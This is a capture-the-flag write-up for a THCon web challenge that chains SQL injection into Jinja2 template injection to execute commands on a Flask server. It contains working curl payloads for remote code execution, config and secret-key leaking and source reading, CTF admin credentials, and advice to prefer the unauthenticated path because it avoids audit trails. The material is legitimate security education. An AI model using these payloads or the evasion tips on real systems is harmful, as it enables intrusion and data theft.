# XSS iN tHe Web — 2

- **Category:** Web
- **Target:** `http://xss-in-the-web.ctf.thcon.party`
- **Prereq:** admin creds from part 1 (`admin / S_P3rSicreteP3asseworde%%`)

```
THC{Th3_R1ght3ous_S1d3_0f_JinJa}
```

## TL;DR

- The `/view-result` page concatenates `agents.name` and `agents.description` into an HTML template, then runs the result through Flask's **`render_template_string`** — Jinja2 SSTI on every cell.
- The SQLi from part 1 lets us inject *any* string into the result set without going through `/add_agent`. UNION-select a Jinja2 RCE payload, hit `/view-result`, the template engine evaluates it.
- Payload: `{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}`. `cycler` is a Jinja2 builtin reachable in the default sandbox; its `__init__.__globals__` exposes `os`.

## 1. The vulnerable code (read after the chain)

The actual bug surface, recovered from the application via this same RCE:

```python
@app.route("/")
def index():
    id = request.args.get("id", "")
    query = f"SELECT name, description FROM agents WHERE id={id}"   # ❶ SQLi
    ...

@app.route("/view-result")
def view_result():
    rows = ""
    for agent in session.get("last_result", []):
        rows += f"<tr><td>{agent[0]}</td><td>{agent[1]}</td></tr>"  # ❷ unfiltered concat
    full_template = BASE_TEMPLATE.replace("{{ rows }}", rows)
    return render_template_string(full_template)                    # ❸ SSTI sink
```

Three bugs in 11 lines: f-string into SQL, raw concat into HTML, then `render_template_string` over the result. Each of the three rules of "never": never interpolate, never concat into templates, never feed user input to the engine.

## 2. Confirming SSTI through the admin path

Add an agent with a Jinja arithmetic expression, then trigger rendering:

```bash
$ curl -s -b jar.txt -X POST http://.../add_agent \
    --data "name={{7*7}}&description=test"

$ curl -s "http://.../?id=999"             # picks up the latest row
$ curl -s http://.../view-result | grep -o '<td>49</td>'
<td>49</td>
```

`{{7*7}} == 49` — Jinja is evaluating the cell. SSTI confirmed.

## 3. Bonus oracle — leak the Flask `SECRET_KEY`

```bash
$ curl -s -b jar.txt -X POST http://.../add_agent \
    --data "name={{config.items()}}&description=x"
$ curl -s http://.../view-result
... ('SECRET_KEY', '6359243919b1200a7cb2ff83c55ba417') ...
```

Useful for forging session cookies if it weren't already a one-step RCE from here. Not needed for the flag.

## 4. Direct chain — SQLi feeds the SSTI sink

Skip `/add_agent` entirely. Inject the Jinja payload as a UNION row, render it via `/view-result`:

```bash
$ PAYLOAD="0 UNION SELECT '{{cycler.__init__.__globals__.os.popen(\"cat /app/flag.txt\").read()}}','x'-- "
$ curl -s --get --data-urlencode "id=${PAYLOAD}" http://.../

$ curl -s http://.../view-result | sed -n 's/.*<td>\(THC[^<]*\)<.*/\1/p'
THC{Th3_R1ght3ous_S1d3_0f_JinJa}
```

Why `cycler.__init__.__globals__.os`? `cycler` is one of the always-available Jinja2 globals; reaching its `__init__` method exposes `__globals__`, which on Flask's default template environment includes a usable `os` (Flask imports it elsewhere in the same module, making it visible in `globals`).

## 5. Read the source through the same primitive

```bash
$ PAYLOAD="0 UNION SELECT '{{cycler.__init__.__globals__.os.popen(\"cat /app/app.py\").read()}}','x'-- "
$ curl -s --get --data-urlencode "id=${PAYLOAD}" http://.../
$ curl -s http://.../view-result
```

That's how the code in §1 was recovered.

## 6. Methodology

- **Always test for SSTI on any page that reflects user-controlled data inside Flask/Django/Jinja routes.** `{{7*7}}` is the cheapest oracle in web; the response either contains `49` (Jinja), `7*7` literal (no interpolation), or HTML-encoded `{{7*7}}` (escaped).
- **Chained sinks are the most dangerous bug pattern.** SQLi alone leaks data; SSTI alone needs admin; the two together skip auth and reach RCE in one request. Map the data flow from input to render and you'll spot these.
- **`cycler.__init__.__globals__.os.popen('...').read()` is the smallest reliable Jinja sandbox-escape that returns command output as a string.** Variants using `lipsum`, `joiner`, `range.__init__.__globals__` work depending on the environment; `cycler` is the most consistently exposed.
- **Use `--data-urlencode` for payloads with `{`, `}`, `'`, `"`.** They reach the server intact without ever needing to manually % -encode each special character.
- **Don't use `/add_agent` if SQLi reaches the same template.** Authenticated paths leave audit trails and pollute the database; the unauthenticated SQLi-into-template path is shorter and quieter.
